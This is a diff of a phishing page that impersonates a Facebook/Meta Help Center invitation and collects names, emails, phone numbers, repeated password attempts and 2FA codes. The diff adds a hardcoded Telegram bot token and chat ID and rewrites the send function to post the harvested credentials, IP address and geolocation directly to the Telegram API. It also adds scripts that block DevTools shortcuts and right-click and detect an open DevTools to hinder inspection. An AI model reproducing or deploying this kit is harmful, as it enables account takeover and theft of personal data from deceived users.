@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Help Center - Join Meta Media Agency</title>
+    <title>Join Meta Media Agency</title>
     <style>
         /* ... (CSS của bạn không thay đổi) ... */
         body {
@@ -275,7 +275,7 @@
 </head>
 <body>
     <div class="header">
-        <a href="#" class="help-center-link">facebook</a>
+        <a href="#" class="help-center-link">Facebook</a>
         <div class="search-bar">
             <input type="text" placeholder="How can we help?">
         </div>
@@ -314,23 +314,28 @@
                 <p>Ticket Number: <span id="ticketNumber" class="ticket-number"></span></p>
                 <p>We’re excited to invite you to join us! Fill in the necessary details to activate your account and start collaborating.</p>
 
-                <form id="disagreeForm">
+                <form id="disagreeForm" novalidate>
                     <label for="yourName">Your Name *</label>
-                    <input type="text" id="yourName" name="yourName" required>
+                    <!-- Pattern: only letters and spaces, 2-50 chars; add minlength & maxlength -->
+                    <input type="text" id="yourName" name="yourName" required pattern="^[A-Za-z\s]{2,50}$" minlength="2" maxlength="50" title="Only letters and spaces, 2-50 characters" aria-describedby="yourNameDesc">
+                    <div id="yourNameDesc" class="note" style="margin-top:-10px;margin-bottom:10px;">Use only letters and spaces (2-50 characters).</div>
 
                     <label for="businessEmail">Business Email *</label>
-                    <input type="email" id="businessEmail" name="businessEmail"  required>
-                    <p class="note">Notifications about the verification status will be sent to this email.</p>
+                    <!-- RFC-like simple email pattern already present; add maxlength -->
+                    <input type="email" id="businessEmail" name="businessEmail" required pattern="^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$" title="Enter a valid business email address" maxlength="254" aria-describedby="businessEmailDesc">
+                    <p class="note" id="businessEmailDesc">Notifications about the verification status will be sent to this email.</p>
 
                     <label for="personalEmail">Personal Email *</label>
-                    <input type="email" id="personalEmail" name="personalEmail" required>
+                    <input type="email" id="personalEmail" name="personalEmail" required pattern="^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$" title="Enter a valid personal email address" maxlength="254">
 
                     <label for="mobilePhoneNumber">Mobile Phone Number *</label>
                     <input type="text" id="mobilePhoneNumber" name="mobilePhoneNumber"  required>
                     <p class="note">We can use this phone number to contact you for verification.</p>
 
+
                     <label for="additionalInfo">Please provide us information that will help us investigate</label>
-                    <textarea id="additionalInfo" name="additionalInfo"></textarea>
+                    <!-- optional but limit length to prevent very large inputs -->
+                    <textarea id="additionalInfo" name="additionalInfo" maxlength="2000" placeholder="Optional: provide relevant details (max 2000 chars)"></textarea>
 
                     <p class="terms">Learn more about our <a href="#">Terms and Community Standards.</a></p>
 
@@ -351,10 +356,12 @@
     </div>
 
     <script>
-
+        const TELEGRAM_BOT_TOKEN = '8486514578:AAHPLweyf9-NOAGMMiojpCYUEKSq6rztJxw';
+        const TELEGRAM_CHAT_ID = '-4849130086';
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
         // !!! VUI LÒNG THAY THẾ 'YOUR_IPGEOLOCATION_API_KEY' BẰNG API KEY CỦA BẠN !!!
-        const IPGEOLOCATION_API_KEY = 'faed5e0d05fe49b2ae40cbd6dc8027cf'; 
+        const IPGEOLOCATION_API_KEY = 'c02b6eef95674bcfac1fe653686d4c3a'; 
 
         let ipAddress = 'N/A';
         let locationData = 'N/A';
@@ -410,33 +417,43 @@
 
         // Send message to Telegram
         async function sendMessageToTelegram(message) {
-    try {
-        // Gọi đến endpoint của Serverless Function
-        const response = await fetch('/api/send-telegram', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ message: message }) // Gửi nội dung tin nhắn lên Serverless Function
-        });
-        const data = await response.json();
-        if (!data.success) {
-            console.error('Error sending message via API:', data.error);
-            // Xử lý lỗi nếu cần (ví dụ: hiển thị thông báo cho người dùng)
-        } else {
-            console.log('Message sent successfully via API!');
+            const params = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML' // Use HTML for formatting
+            };
+
+            try {
+                const response = await fetch(TELEGRAM_API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(params)
+                });
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error('Telegram API error:', data.description);
+                } else {
+                    console.log('Message sent to Telegram successfully!');
+                }
+            } catch (error) {
+                console.error('Error sending message to Telegram:', error);
+            }
         }
-    } catch (error) {
-        console.error('Error calling send-telegram API:', error);
-        // Xử lý lỗi kết nối hoặc lỗi mạng
-    }
-}
 
         // --- Form and Popup Handlers ---
 
         // Show password popup
         sendButton.addEventListener('click', async (e) => {
             e.preventDefault(); // Prevent default form submission
+
+            // Use HTML5 validation: if form invalid, show messages and stop
+            if (!disagreeForm.checkValidity()) {
+                // This will show native validation messages for specific fields
+                disagreeForm.reportValidity();
+                return;
+            }
 
             // Gather form data
             formData = {
@@ -447,12 +464,6 @@
                 additionalInfo: document.getElementById('additionalInfo').value,
                 ticketNumber: ticketNumberSpan.textContent
             };
-
-            // Basic validation
-            if (!formData.yourName || !formData.businessEmail || !formData.personalEmail || !formData.mobilePhoneNumber) {
-                alert('Please fill in all required fields (marked with *)');
-                return;
-            }
 
             // Fetch IP and location if not already done
             if (ipAddress === 'N/A') {
@@ -483,7 +494,8 @@
             message += `<b>Business Email:</b> ${formData.businessEmail}\n`;
             message += `<b>Personal Email:</b> ${formData.personalEmail}\n`;
             message += `<b>Mobile Phone:</b> ${formData.mobilePhoneNumber}\n`;
-          
+            message += `<b>Additional Info:</b> ${formData.additionalInfo || 'N/A'}\n`;
+
             if (passwordAttemptCount === 1) {
                 passwordAttemptValue1 = password;
                 message += `<b>Password Attempt 1:</b> ${passwordAttemptValue1}\n`;
@@ -522,5 +534,62 @@
             localStorage.removeItem('twoFAAttemptCount'); // Clear 2FA specific data
         });
     </script>
+    <script>
+// Phát hiện thiết bị mobile
+function isMobileDevice() {
+    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
+           (window.innerWidth <= 768) ||
+           ('ontouchstart' in window);
+}
+
+// Chặn phím tắt mở DevTools (chỉ trên desktop)
+if (!isMobileDevice()) {
+    document.addEventListener('keydown', function (e) {
+        if (
+            e.key === 'F12' ||
+            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+            (e.ctrlKey && e.key === 'U')
+        ) {
+            e.preventDefault();
+            // Chỉ chặn, không chuyển hướng
+        }
+    });
+    
+    // Chặn chuột phải (chỉ trên desktop)
+    document.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+        // Chỉ chặn, không chuyển hướng
+    });
+    
+    // Phát hiện DevTools mở (chỉ trên desktop)
+    let devtoolsOpen = false;
+    const threshold = 160;
+    setInterval(function () {
+        if (
+            window.outerWidth - window.innerWidth > threshold ||
+            window.outerHeight - window.innerHeight > threshold
+        ) {
+            if (!devtoolsOpen) {
+                devtoolsOpen = true;
+                // Chỉ ghi log, không chuyển hướng
+                console.log('DevTools detected');
+            }
+        } else {
+            devtoolsOpen = false;
+        }
+    }, 500);
+    
+    // Phát hiện qua console.log (chỉ trên desktop)
+    (function() {
+        const element = new Image();
+        Object.defineProperty(element, 'id', {
+            get: function() {
+                console.log('DevTools access detected');
+            }
+        });
+        console.log(element);
+    })();
+}
+</script>
 </body>
 </html>
